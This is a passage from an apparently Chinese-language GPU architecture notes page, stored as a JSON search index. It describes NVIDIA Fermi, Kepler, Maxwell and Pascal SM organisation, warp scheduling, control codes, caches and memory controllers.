<p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0cSM \u200b\u5185\u90e8\u200b\u8bbe\u7f6e\u200b\u4e86\u200b\u4e24\u4e2a\u200b Warp Scheduler\uff0c\u200b\u53ef\u4ee5\u200b\u540c\u65f6\u200b\u4ece\u200b\u4e24\u4e2a\u200b\u72ec\u7acb\u200b\u7684\u200b warp \u200b\u53bb\u200b\u53d1\u5c04\u200b\u6307\u4ee4\u200b\u3002\u200b\u6bcf\u4e2a\u200b warp \u200b\u53ea\u4f1a\u200b\u53bb\u200b\u7528\u200b 16 \u200b\u4e2a\u200b CUDA core \u200b\u6216\u8005\u200b 16 \u200b\u4e2a\u200b LD/ST \u200b\u5355\u5143\u200b\u6216\u8005\u200b 4 \u200b\u4e2a\u200b SFU \u200b\u5355\u5143\u200b\u53bb\u200b\u6267\u884c\u200b\uff0c\u200b\u4e00\u5171\u200b\u6709\u200b 4 \u200b\u4e2a\u200b dispatch port\uff0c\u200b\u6bcf\u4e2a\u200b dispatch port \u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u53ea\u80fd\u200b\u63a5\u53d7\u200b\u6700\u200b\u591a\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u3002\u200b\u56fe\u4e2d\u200b\u8868\u793a\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u4e00\u6761\u200b\u6d6e\u70b9\u200b\u6216\u8005\u200b\u6574\u6570\u200b\u6307\u4ee4\u200b\uff0c\u200b\u4f1a\u200b\u8fdb\u5165\u200b\u67d0\u200b\u4e00\u7ec4\u200b CUDA core \u200b\u6267\u884c\u200b\uff0c\u200b\u6267\u884c\u200b\u7684\u200b\u65f6\u5019\u200b\u9700\u8981\u200b\u4e24\u4e2a\u200b\u5468\u671f\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u5bf9\u5e94\u200b 16 \u200b\u4e2a\u200b\u7ebf\u7a0b\u200b\uff0c\u200b\u4e5f\u200b\u610f\u5473\u7740\u200b dispatch port \u200b\u9700\u8981\u200b\u5360\u7528\u200b\u4e24\u4e2a\u200b\u5468\u671f\u200b\uff1b\u200b\u5982\u679c\u200b\u662f\u200b SIN \u200b\u6216\u8005\u200b RCP \u200b\u6307\u4ee4\u200b\uff0c\u200b\u5219\u200b\u9700\u8981\u200b\u516b\u4e2a\u200b\u5468\u671f\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u5bf9\u5e94\u200b 4 \u200b\u4e2a\u200b\u7ebf\u7a0b\u200b\uff1b\u200b\u5982\u679c\u200b\u662f\u200b\u8bbf\u5b58\u200b\u6307\u4ee4\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u9700\u8981\u200b\u4e24\u4e2a\u200b\u5468\u671f\u200b\u3002</p> <p>GigaThread engine \u200b\u8d1f\u8d23\u200b\u628a\u200b thread block \u200b\u5206\u200b\u53d1\u7ed9\u200b SM\uff0c\u200b\u540c\u65f6\u200b\u53ef\u4ee5\u200b\u63d0\u9ad8\u200b\u4e0a\u4e0b\u6587\u200b\u5207\u6362\u200b\u7684\u200b\u901f\u5ea6\u200b\uff0c\u200b\u4f7f\u5f97\u200b GPGPU \u200b\u53ef\u4ee5\u200b\u9ad8\u6548\u200b\u5730\u200b\u5904\u7406\u200b\u6765\u81ea\u200b\u4e0d\u540c\u200b\u5e94\u7528\u200b\u7684\u200b kernel\uff0c\u200b\u6839\u636e\u200b Fermi whitepaper\uff1a</p> <ul> <li>10x faster application context switching: below 25 microseconds</li> <li>Concurrent kernel execution: different kernels of the same application context can execute on the GPU at the same time</li> <li>Out of Order thread block execution</li> <li>Dual overlapped memory transfer engines</li> </ul> <p>\u200b\u4e0b\u9762\u200b\u662f\u200b Tesla 1.0\u3001Tesla 2.0 \u200b\u548c\u200b Fermi \u200b\u67b6\u6784\u200b\u7684\u200b GPU \u200b\u7684\u200b\u5bf9\u6bd4\u200b\u8868\u683c\u200b\uff1a</p> <p> </p> Tesla \u200b\u548c\u200b Fermi \u200b\u67b6\u6784\u200b\u5bf9\u6bd4\u200b\uff08\u200b\u6765\u6e90\u200b\uff1aFermi Whitepaper Summary Table\uff09"},{"location":"hardware/gpgpu.html#nvidia-kepler","title":"NVIDIA Kepler","text":"<p>Whitepaper: NVIDIA\u2019s Next Generation CUDA Compute Architecture: Kepler TM GK110/210</p> <p>Datasheet: NVIDIA\u00ae KEPLER GK110 NEXT-GENERATION CUDA\u00ae COMPUTE ARCHITECTURE</p> <p>Kepler \u200b\u76f8\u6bd4\u200b Fermi \u200b\u67b6\u6784\u200b\u7684\u200b\u4e3b\u8981\u200b\u6539\u8fdb\u200b\uff1a</p> <ol> <li>Dynamic Parallelism \u200b\u548c\u200b Grid Management Unit\uff1a\u200b\u4e0d\u4ec5\u200b CPU \u200b\u53ef\u4ee5\u200b\u63d0\u4ea4\u200b\u4efb\u52a1\u200b\u5230\u200b GPU \u200b\u6267\u884c\u200b\uff0cGPU \u200b\u81ea\u5df1\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u63d0\u4ea4\u200b\u4efb\u52a1\u200b\u5230\u200b\u81ea\u5df1\u200b\u4e0a\u53bb\u200b\u6267\u884c\u200b</li> <li>Hyper-Q\uff1a\u200b\u5141\u8bb8\u200b\u591a\u4e2a\u200b CPU \u200b\u6838\u5fc3\u200b\u540c\u65f6\u200b\u5411\u200b GPU \u200b\u63d0\u4ea4\u200b\u4efb\u52a1\u200b\uff0c\u200b\u628a\u200b\u786c\u4ef6\u200b\u4efb\u52a1\u200b\u961f\u5217\u200b\u4ece\u200b 1 \u200b\u589e\u52a0\u200b\u5230\u200b\u4e86\u200b 32 \u200b\u4e2a\u200b\u3002\u200b\u6bcf\u4e2a\u200b CUDA stream \u200b\u4f1a\u200b\u5bf9\u5e94\u200b\u5230\u200b\u4e00\u4e2a\u200b\u786c\u4ef6\u200b\u4efb\u52a1\u200b\u961f\u5217\u200b\uff0c\u200b\u56e0\u6b64\u200b\u589e\u52a0\u200b\u786c\u4ef6\u200b\u4efb\u52a1\u200b\u961f\u5217\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u51cf\u5c11\u200b false dependency\u3002</li> <li>GPUDirect\uff1a\u200b\u652f\u6301\u200b RDMA</li> </ol> <p>\u200b\u548c\u200b\u524d\u200b\u4e24\u4ee3\u200b\u4e0d\u540c\u200b\u7684\u200b\u662f\u200b\uff0cKepler \u200b\u53bb\u6389\u200b\u4e86\u200b TPC/GPC \u200b\u8fd9\u200b\u4e00\u4e2a\u200b\u5c42\u7ea7\u200b\uff0c\u200b\u800c\u662f\u200b\u628a\u200b SM \u200b\u505a\u200b\u7684\u200b\u5f88\u5927\u200b\uff0c\u200b\u79f0\u4e3a\u200b SMX\uff0c\u200b\u4e00\u4e2a\u200b GK110/GK210 \u200b\u6709\u200b 15 \u200b\u4e2a\u200b SMX\uff0c\u200b\u6bcf\u4e2a\u200b SMX \u200b\u91cc\u9762\u200b\u6709\u200b\uff1a</p> <ul> <li>\u200b\u4e00\u4e2a\u200b SM \u200b\u6709\u200b 192 \u200b\u4e2a\u200b\u5355\u7cbe\u5ea6\u200b CUDA Core\uff0c64 \u200b\u4e2a\u200b\u53cc\u200b\u7cbe\u5ea6\u200b\u8ba1\u7b97\u200b\u5355\u5143\u200b\uff0c32 \u200b\u4e2a\u200b SFU\uff0c32 \u200b\u4e2a\u200b LD/ST \u200b\u5355\u5143\u200b</li> <li>\u200b\u4e00\u4e2a\u200b SM \u200b\u6709\u200b\u56db\u4e2a\u200b Warp Scheduler\uff0c\u200b\u6bcf\u4e2a\u200b Warp Scheduler \u200b\u9009\u51fa\u200b\u540c\u4e00\u4e2a\u200b Warp \u200b\u7684\u200b\u4e24\u6761\u200b\u6307\u4ee4\u200b\u53bb\u200b\u53d1\u5c04\u200b</li> <li>\u200b\u4e00\u4e2a\u200b SM \u200b\u6709\u200b 65536 \u200b\u6216\u8005\u200b 131072 \u200b\u4e2a\u200b 32 \u200b\u4f4d\u200b\u5bc4\u5b58\u5668\u200b</li> </ul> <p> </p> Kepler \u200b\u67b6\u6784\u200b SM\uff08\u200b\u6765\u6e90\u200b\uff1aNVIDIA\u2019s Next Generation CUDA Compute Architecture: Kepler TM GK110/210\uff09 <p>\u200b\u4e0d\u8fc7\u200b\u6839\u636e\u200b Inside Kepler, Nvidia\u2019s Strong Start on 28 nm\uff0cKepler \u200b\u6bcf\u4e2a\u200b SM \u200b\u5185\u90e8\u200b\u5206\u4e3a\u200b\u56db\u4e2a\u200b Partition\uff08SMSP\uff0cStreaming Multiprocessor Sub Partition\uff09\uff0c\u200b\u6bcf\u4e2a\u200b Partition \u200b\u5305\u62ec\u200b\u4e00\u4e2a\u53cc\u200b\u53d1\u5c04\u200b\u7684\u200b Warp Scheduler\uff0c32 \u200b\u4e2a\u200b FP32 core\uff0c8 \u200b\u4e2a\u200b SFU\u3002\u200b\u56db\u4e2a\u200b Partition \u200b\u4ee5\u5916\u200b\u8fd8\u6709\u200b 64 \u200b\u4e2a\u200b shared FP32 core\u3002\u200b\u6216\u8bb8\u200b SMSP \u200b\u7684\u200b\u6982\u5ff5\u200b\u4ece\u200b Kepler \u200b\u8fd9\u200b\u4e00\u4ee3\u200b\u5c31\u200b\u6709\u200b\u4e86\u200b\uff08<code>For all GPUs since Kepler (with exception to GP100) there are 4 SMSP per SM.</code>\uff0c\u200b\u89c1\u200b https://forums.developer.nvidia.com/t/question-about-smsp-and-sm/154560/2\uff09\uff0c\u200b\u53ea\u4e0d\u8fc7\u200b\u5728\u200b\u7ed8\u5236\u200b\u5b83\u200b\u7684\u200b SM \u200b\u56fe\u793a\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u8fd8\u200b\u6ca1\u6709\u200b\u5206\u5f00\u200b\u753b\u200b\u3002\u200b\u6216\u8bb8\u200b\u662f\u200b\u89c9\u5f97\u200b\u5171\u4eab\u200b\u7684\u200b FP32 \u200b\u4e0d\u200b\u5bb9\u6613\u200b\u753b\u200b\u5427\u200b\u3002\u200b\u4ece\u200b Kepler \u200b\u7684\u200b\u4e0b\u4e00\u4ee3\u200b Maxwell \u200b\u5f00\u59cb\u200b\uff0c\u200b\u5c31\u200b\u6ca1\u6709\u200b\u5171\u4eab\u200b\u7684\u200b FP32 \u200b\u5355\u5143\u200b\u4e86\u200b\uff0c\u200b\u6240\u6709\u200b\u8ba1\u7b97\u200b\u5355\u5143\u200b\u90fd\u200b\u662f\u200b\u5f52\u200b\u5230\u200b\u67d0\u4e2a\u200b partition \u200b\u4e0b\u200b\u3002\uff08<code>As with SMX, each SMM has four warp schedulers. Unlike SMX, however, all SMM core functional units are assigned to a particular scheduler, with no shared units. Along with the selection of a power-of-two number of CUDA Cores per SM, which simplifies scheduling and reduces stall cycles, this partitioning of SM computational resources in SMM is a major component of the streamlined efficiency of SMM.</code>\uff0c\u200b\u6765\u6e90\u200b Tuning CUDA Applications for Maxwell\uff09\u3002</p> <p>Kepler \u200b\u4e3a\u4e86\u200b\u8981\u200b\u652f\u6301\u200b\u56db\u4e2a\u200b Warp Scheduler\uff0c\u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b Dispatch 8 \u200b\u6761\u200b\u6307\u4ee4\u200b\uff0c\u200b\u7b80\u5316\u200b\u4e86\u200b Warp Scheduler \u200b\u7684\u200b\u5de5\u4f5c\u200b\u65b9\u5f0f\u200b\uff1a\u200b\u7531\u4e8e\u200b\u8ba1\u7b97\u200b\u6307\u4ee4\u200b\u7684\u200b\u5ef6\u8fdf\u200b\u662f\u200b\u56fa\u5b9a\u200b\u7684\u200b\uff0c\u200b\u56e0\u6b64\u200b\u53ef\u4ee5\u200b\u7531\u200b\u7f16\u8bd1\u5668\u200b\u6765\u200b\u8ba1\u7b97\u200b\u4e00\u4e9b\u200b\u6307\u4ee4\u200b\u7684\u200b\u8c03\u5ea6\u200b\uff0c\u200b\u4ece\u800c\u200b\u51cf\u8f7b\u200b\u4e86\u200b\u786c\u4ef6\u200b\u8c03\u5ea6\u200b\u7684\u200b\u8d1f\u62c5\u200b\uff0c\u200b\u786c\u4ef6\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u4ece\u200b\u6307\u4ee4\u200b\u4e2d\u200b\u8bfb\u53d6\u200b\u9884\u5148\u200b\u8ba1\u7b97\u200b\u597d\u200b\u7684\u200b\u4fe1\u606f\u200b\uff0c\u200b\u7136\u540e\u200b\u5728\u200b\u8c03\u5ea6\u200b Warp \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u6839\u636e\u200b\u8fd9\u4e9b\u200b\u4fe1\u606f\u200b\u9632\u6b62\u200b\u4e00\u4e9b\u200b Warp \u200b\u88ab\u200b\u8c03\u5ea6\u200b\u3002\u200b\u8fd9\u4e2a\u200b\u4fe1\u606f\u200b\u5e94\u8be5\u200b\u662f\u200b\u4fdd\u5b58\u200b\u5728\u200b Control Code/Instruction \u200b\u4e2d\u200b\u7684\u200b\uff0c\u200b\u7f51\u4e0a\u200b\u4e5f\u200b\u6709\u200b\u4e00\u4e9b\u200b\u9488\u5bf9\u200b Control Code/Instruction \u200b\u7f16\u7801\u200b\u7684\u200b\u7814\u7a76\u200b\uff1a</p> <ul> <li>https://github.com/cloudcores/CuAssembler/blob/master/UserGuide.md</li> <li>https://github.com/NervanaSystems/maxas/wiki/Control-Codes</li> <li>https://zhuanlan.zhihu.com/p/166180054</li> </ul> <p>Control Code \u200b\u4e3b\u8981\u200b\u5305\u62ec\u200b\u5982\u4e0b\u200b\u7684\u200b\u4fe1\u606f\u200b\uff1a</p> <ul> <li>Stall Count: \u200b\u5f53\u524d\u200b\u6307\u4ee4\u200b\u53d1\u5c04\u200b\u540e\u200b\uff0c\u200b\u9884\u8ba1\u200b\u7b49\u5f85\u200b\u591a\u5c11\u200b\u4e2a\u200b\u5468\u671f\u200b\u518d\u200b\u53d1\u5c04\u200b\u4e0b\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b</li> <li>Yield Hint\uff1a\u200b\u5f53\u524d\u200b\u6307\u4ee4\u200b\u53d1\u5c04\u200b\u540e\u200b\uff0c\u200b\u5efa\u8bae\u200b\u5207\u6362\u200b\u5230\u200b\u5176\u4ed6\u200b Warp</li> <li>Read Dependency Barrier\uff1a\u200b\u8bbe\u7f6e\u200b\u4e00\u4e2a\u200b Dependency Barrier\uff0c\u200b\u8868\u793a\u200b\u8fd9\u200b\u6761\u200b\u6307\u4ee4\u200b\u9700\u8981\u200b\u5ef6\u8fdf\u200b\u8bfb\u200b\u67d0\u4e2a\u200b\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u5982\u679c\u200b\u540e\u7eed\u200b\u6709\u200b\u6307\u4ee4\u200b\u4f1a\u200b\u4fee\u6539\u200b\u540c\u4e00\u4e2a\u200b\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u9700\u8981\u200b\u4fdd\u8bc1\u200b\u540e\u7eed\u200b\u7684\u200b\u6307\u4ee4\u200b\u8981\u200b\u7b49\u5f85\u200b\u8fd9\u4e2a\u200b Dependency Barrier\uff0c\u200b\u5426\u5219\u200b\u53ef\u80fd\u200b\u540e\u9762\u200b\u7684\u200b\u6307\u4ee4\u200b\u4fee\u6539\u200b\u4e86\u200b\u524d\u9762\u200b\u6307\u4ee4\u200b\u6240\u200b\u9700\u8981\u200b\u7684\u200b\u64cd\u4f5c\u6570\u200b</li> <li>Write Dependency Barrier\uff1a\u200b\u8bbe\u7f6e\u200b\u4e00\u4e2a\u200b Dependency Barrier\uff0c\u200b\u8868\u793a\u200b\u8fd9\u200b\u6761\u200b\u6307\u4ee4\u200b\u9700\u8981\u200b\u5199\u5165\u200b\u67d0\u4e2a\u200b\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u4f46\u662f\u200b\u6307\u4ee4\u200b\u6267\u884c\u200b\u7684\u200b\u5b9e\u73b0\u200b\u4e0d\u200b\u786e\u5b9a\u200b\uff0c\u200b\u7528\u200b stall count \u200b\u4e0d\u80fd\u200b\u4fdd\u8bc1\u6570\u636e\u200b\u5728\u200b\u540e\u7eed\u200b\u4f9d\u8d56\u200b\u5b83\u200b\u7684\u200b\u6307\u4ee4\u200b\u53d1\u5c04\u200b\u524d\u200b\u51c6\u5907\u200b\u597d\u200b\uff0c\u200b\u5c31\u8ba9\u200b\u540e\u7eed\u200b\u6307\u4ee4\u200b\u7b49\u5f85\u200b\u8fd9\u4e2a\u200b Dependency Barrier</li> <li>Wait Dependency Barrier\uff1a\u200b\u7b49\u5f85\u200b\u82e5\u5e72\u4e2a\u200b Dependency Barrier\uff0c\u200b\u5f53\u200b\u8bbe\u7f6e\u200b\u8be5\u200b Barrier \u200b\u4e0a\u200b\u7684\u200b\u6307\u4ee4\u200b\u6267\u884c\u200b\u5b8c\u6210\u200b\uff0c\u200b\u624d\u200b\u53ef\u4ee5\u200b\u8c03\u5ea6\u200b\u5f53\u524d\u200b\u6307\u4ee4\u200b</li> </ul> <p>\u200b\u5185\u5b58\u200b\u5c42\u7ea7\u200b\u65b9\u9762\u200b\uff0cKepler \u200b\u5f15\u5165\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u989d\u5916\u200b\u7684\u200b 48KB \u200b\u53ea\u8bfb\u200b Data Cache\uff0c\u200b\u7528\u4e8e\u200b\u4fdd\u5b58\u200b\u53ea\u8bfb\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u63d0\u4f9b\u200b\u76f8\u6bd4\u200b Shared/L1 cache \u200b\u66f4\u200b\u9ad8\u200b\u7684\u200b\u6027\u80fd\u200b\u3002\u200b\u6839\u636e\u200b https://arxiv.org/pdf/1804.06826.pdf\uff0cKepler \u200b\u67b6\u6784\u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u6bcf\u4e2a\u200b SM \u200b\u53ef\u4ee5\u200b\u8bfb\u53d6\u200b 256 \u200b\u5b57\u8282\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\uff0c\u200b\u6bcf\u4e2a\u200b LD/ST unit \u200b\u6bcf\u200b\u5468\u671f\u200b\u53ef\u4ee5\u200b\u8bfb\u53d6\u200b \\(128 / 32 = 4\\) \u200b\u5b57\u8282\u200b\u7684\u200b\u6570\u636e\u200b\u3002</p> <p>GK110 \u200b\u6709\u200b 1536 KB \u200b\u7684\u200b L2 \u200b\u7f13\u5b58\u200b\u3002</p>"},{"location":"hardware/gpgpu.html#nvidia-maxwell","title":"NVIDIA Maxwell","text":"<p>Whitepaper: NVIDIA GeForce GTX 980</p> <p>PPT: New GPU Features of NVIDIA\u2019s Maxwell Architecture</p> <p>Blog: 5 Things You Should Know About the New Maxwell GPU Architecture</p> <p>\u200b\u867d\u7136\u200b Kepler \u200b\u628a\u200b GPC \u200b\u5c42\u6b21\u200b\u53bb\u6389\u200b\u4e86\u200b\uff0c\u200b\u4f46\u662f\u200b Maxwell \u200b\u67b6\u6784\u200b\u53c8\u200b\u628a\u200b GPC \u200b\u52a0\u56de\u6765\u200b\u4e86\u200b\u3002Maxwell \u200b\u5206\u4e3a\u200b\u4e24\u4ee3\u200b\uff0c\u200b\u7b2c\u4e00\u4ee3\u200b\u7684\u200b GM107 \u200b\u4ee5\u53ca\u200b\u7b2c\u4e8c\u4ee3\u200b\u7684\u200b GM204\u3002GM204 \u200b\u662f\u200b\u4e00\u4e2a\u200b Maxwell \u200b\u67b6\u6784\u200b\u7684\u200b GPU \u200b\u82af\u7247\u200b\uff1a</p> <ul> <li>4 GPC\uff0c\u200b\u6bcf\u4e2a\u200b GPC \u200b\u6709\u200b\u4e00\u4e2a\u200b raster engine \u200b\u548c\u200b\u56db\u4e2a\u200b SMM</li> <li>16 SMM\uff0c\u200b\u6bcf\u4e2a\u200b SMM \u200b\u6709\u200b 128 \u200b\u4e2a\u200b CUDA core\uff0c\u200b\u4e00\u4e2a\u200b PolyMorph engine \u200b\u548c\u200b 8 \u200b\u4e2a\u200b texture unit</li> <li>4 Memory Controller\uff0c\u200b\u4e00\u5171\u200b 256 \u200b\u4f4d\u200b\u5bbd\u200b\uff0c7Gbps GDDR5 \u200b\u5185\u5b58\u200b\uff0c\u200b\u6bcf\u4e2a\u200b Memory Controller \u200b\u5e26\u6709\u200b 16 ROP \u200b\u5355\u5143\u200b\u548c\u200b 512KB \u200b\u7684\u200b L2 \u200b\u7f13\u5b58\u200b</li> <li>28nm \u200b\u5236\u7a0b\u200b</li> </ul> <p>Maxwell \u200b\u7684\u200b SM \u200b\u53eb\u505a\u200b SMM\uff0c\u200b\u5b83\u200b\u4f9d\u7136\u200b\u662f\u200b\u56db\u4e2a\u200b Warp Scheduler\uff0c\u200b\u4f46\u662f\u200b\u548c\u200b Kepler \u200b\u4e0d\u540c\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u5b83\u200b\u628a\u200b\u8ba1\u7b97\u200b\u5355\u5143\u200b\u4e5f\u200b\u5212\u5206\u200b\u6210\u200b\u4e86\u200b\u56db\u4efd\u200b\uff0c\u200b\u6bcf\u200b\u4e00\u4efd\u200b\u53eb\u505a\u200b\u4e00\u4e2a\u200b Processing Block\uff08PB\uff09\u3002\u200b\u6bcf\u4e2a\u200b Processing Block \u200b\u91cc\u9762\u200b\u6709\u200b\u4e00\u4e2a\u200b Instruction Buffer\uff0c\u200b\u4e00\u4e2a\u200b\u6bcf\u200b\u5468\u671f\u200b Dispatch \u200b\u4e24\u6761\u200b\u6307\u4ee4\u200b\u7684\u200b Warp Scheduler\uff0c32 \u200b\u4e2a\u200b CUDA core\uff0c1 \u200b\u4e2a\u200b\u53cc\u200b\u7cbe\u5ea6\u200b\u8ba1\u7b97\u200b\u5355\u5143\u200b\uff0c8 \u200b\u4e2a\u200b LD/ST unit \u200b\u4ee5\u53ca\u200b 8 \u200b\u4e2a\u200b SFU\u3002\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\uff0c\u200b\u6bcf\u4e2a\u200b SM \u200b\u6709\u200b 128 \u200b\u4e2a\u200b CUDA core\uff0c\u200b\u6570\u91cf\u200b\u6bd4\u200b Kepler \u200b\u7684\u200b 192 CUDA core/SM \u200b\u53d8\u5c11\u200b\u4e86\u200b\uff0c\u200b\u4f46\u662f\u200b Maxwell \u200b\u4e5f\u200b\u914d\u7f6e\u200b\u4e86\u200b\u66f4\u200b\u591a\u200b\u7684\u200b SM\u3002\u200b\u8fd9\u4e9b\u200b\u8ba1\u7b97\u200b\u5355\u5143\u200b\u53ea\u4f1a\u200b\u88ab\u200b Processing Block \u200b\u5185\u200b\u7684\u200b Warp scheduler \u200b\u4f7f\u7528\u200b\u3002</p> <p> </p> Maxwell \u200b\u67b6\u6784\u200b SM\uff08\u200b\u6765\u6e90\u200b\uff1aNVIDIA GeForce GTX 980 Whitepaper\uff09 <p>Maxwell \u200b\u67b6\u6784\u200b\u7684\u200b L1 \u200b\u7f13\u5b58\u200b\u548c\u200b Shared Memory \u200b\u4e0d\u518d\u200b\u5171\u4eab\u200b\uff0cShared Memory \u200b\u72ec\u5360\u200b 96KB\uff0c\u200b\u7136\u540e\u200b L1 \u200b\u7f13\u5b58\u200b\u548c\u200b Texture \u200b\u7f13\u5b58\u200b\u5171\u4eab\u200b\u7a7a\u95f4\u200b\u3002\u200b\u6839\u636e\u200b https://arxiv.org/pdf/1804.06826.pdf\uff0cMaxwell \u200b\u67b6\u6784\u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u6bcf\u4e2a\u200b SM \u200b\u53ef\u4ee5\u200b\u8bfb\u53d6\u200b 256 \u200b\u5b57\u8282\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\uff0c\u200b\u6bcf\u4e2a\u200b LD/ST unit \u200b\u6bcf\u200b\u5468\u671f\u200b\u53ef\u4ee5\u200b\u8bfb\u53d6\u200b \\(128 / 4 / 8 = 4\\) \u200b\u5b57\u8282\u200b\u7684\u200b\u6570\u636e\u200b\u3002</p> <p>GM200 \u200b\u6709\u200b 3072 KB \u200b\u7684\u200b L2 \u200b\u7f13\u5b58\u200b\u3002</p>"},{"location":"hardware/gpgpu.html#nvidia-pascal","title":"NVIDIA Pascal","text":"<p>Whitepaper: NVIDIA Tesla P100</p> <p>GP100 \u200b\u662f\u200b Pascal \u200b\u67b6\u6784\u200b\u7684\u200b\u82af\u7247\u200b\uff0c\u200b\u6539\u8fdb\u200b\u5982\u4e0b\u200b\uff1a</p> <ul> <li>\u200b\u652f\u6301\u200b NVLink\uff0c\u200b\u53cc\u5411\u200b\u5e26\u5bbd\u200b 160 GB/s</li> <li>\u200b\u4f7f\u7528\u200b HBM2 \u200b\u4f5c\u4e3a\u200b\u663e\u5b58\u200b\uff0c\u200b\u66ff\u4ee3\u200b\u4e86\u200b GDDR \u200b\u5185\u5b58\u200b</li> <li>TSMC 16nm FinFET \u200b\u5de5\u827a\u200b</li> <li>\u200b\u652f\u6301\u200b Unified Memory\uff0c\u200b\u4f7f\u5f97\u200b CPU \u200b\u548c\u200b GPU \u200b\u53ef\u4ee5\u200b\u5171\u4eab\u200b\u865a\u62df\u5730\u5740\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u8ba9\u200b\u6570\u636e\u200b\u81ea\u52a8\u200b\u8fdb\u884c\u200b\u8fc1\u79fb\u200b</li> <li>\u200b\u652f\u6301\u200b Compute Preemption\uff0c\u200b\u4f7f\u5f97\u200b kernel \u200b\u53ef\u4ee5\u200b\u5728\u200b\u6307\u4ee4\u200b\u7ea7\u522b\u200b\u505a\u200b\u62a2\u5360\u200b\uff0c\u200b\u800c\u200b\u4e0d\u662f\u200b thread block \u200b\u7ea7\u522b\u200b\uff0c\u200b\u8fd9\u6837\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u8ba9\u200b\u8c03\u8bd5\u5668\u200b\u7b49\u200b\u4ea4\u4e92\u5f0f\u200b\u7684\u200b\u4efb\u52a1\u200b\u4e0d\u4f1a\u200b\u963b\u788d\u200b\u5176\u4ed6\u200b\u8ba1\u7b97\u200b\u4efb\u52a1\u200b\u7684\u200b\u8fdb\u884c\u200b\uff1b\u200b\u5728\u200b Kepler \u200b\u67b6\u6784\u200b\u4e2d\u200b\uff0c\u200b\u53ea\u6709\u200b\u7b49\u200b\u4e00\u4e2a\u200b thread block \u200b\u7684\u200b\u6240\u6709\u200b thread \u200b\u5b8c\u6210\u200b\uff0c\u200b\u786c\u4ef6\u200b\u624d\u200b\u53ef\u4ee5\u200b\u505a\u200b\u4e0a\u4e0b\u6587\u200b\u5207\u6362\u200b\uff0c\u200b\u4f46\u662f\u200b\u5982\u679c\u200b\u4e2d\u95f4\u200b\u9047\u5230\u200b\u4e86\u200b\u8c03\u8bd5\u5668\u200b\u7684\u200b\u65ad\u70b9\u200b\uff0c\u200b\u8fd9\u65f6\u5019\u200b thread block \u200b\u5e76\u200b\u6ca1\u6709\u200b\u5b8c\u6210\u200b\uff0c\u200b\u90a3\u4e48\u200b\u6b64\u65f6\u200b\u53ea\u6709\u200b\u8c03\u8bd5\u5668\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b GPU\uff0c\u200b\u5176\u4ed6\u200b\u4efb\u52a1\u200b\u5c31\u200b\u65e0\u6cd5\u200b\u5728\u200b GPGPU \u200b\u4e0a\u200b\u6267\u884c\u200b</li> <li>GP100 \u200b\u6709\u200b 6 \u200b\u4e2a\u200b GPC\uff0c\u200b\u6bcf\u4e2a\u200b GPC \u200b\u5185\u90e8\u200b\u6709\u200b 5 \u200b\u4e2a\u200b TPC\uff0c\u200b\u6bcf\u4e2a\u200b TPC \u200b\u5185\u90e8\u200b\u6709\u200b 2 \u200b\u4e2a\u200b SM\uff1bGP100 \u200b\u603b\u5171\u200b\u6709\u200b \\(6*5*2=60\\) \u200b\u4e2a\u200b SM\uff08<code>A full GP100 consists of six GPCs, 60 Pascal SMs, 30 TPCs (each including two SMs)</code>\uff09</li> <li>\u200b\u6bcf\u4e2a\u200b SM \u200b\u6709\u200b 64 \u200b\u4e2a\u200b\u5355\u7cbe\u5ea6\u200b CUDA core\uff0c32 \u200b\u4e2a\u200b\u53cc\u200b\u7cbe\u5ea6\u200b CUDA core\uff0c4 \u200b\u4e2a\u200b texture unit</li> <li>8 \u200b\u4e2a\u200b 512 \u200b\u4f4d\u200b\u7684\u200b\u5185\u5b58\u200b\u63a7\u5236\u5668\u200b\uff08<code>eight 512-bit memory controllers (4096 bits total)</code>\uff09\uff0c\u200b\u6bcf\u4e2a\u200b\u5185\u5b58\u200b\u63a7\u5236\u5668\u200b\u9644\u5e26\u200b 512 KB L2 \u200b\u7f13\u5b58\u200b\uff0c\u200b\u603b\u5171\u200b\u6709\u200b 4096 KB \u200b\u7684\u200b L2 \u200b\u7f13\u5b58\u200b\u3002\u200b\u6bcf\u200b\u4e24\u4e2a\u200b\u5185\u5b58\u200b\u63a7\u5236\u5668\u200b\u4e3a\u200b\u4e00\u7ec4\u200b\uff0c\u200b\u8fde\u63a5\u200b\u5230\u200b 4 \u200b\u4e2a\u200b 1024 \u200b\u4f4d\u200b\u7684\u200b HBM2 \u200b\u5185\u5b58\u200b\uff08<code>Each memory controller is attached to 512 KB of L2 cache, and each HBM2 DRAM stack is controlled by a pair of memory controllers. The full GPU includes a total of 4096 KB of L2 cache.</code>\uff09</li> <li>\u200b\u652f\u6301\u200b FP16 \u200b\u8ba1\u7b97\u200b\uff0c\u200b\u4e24\u4e2a\u200b FP16 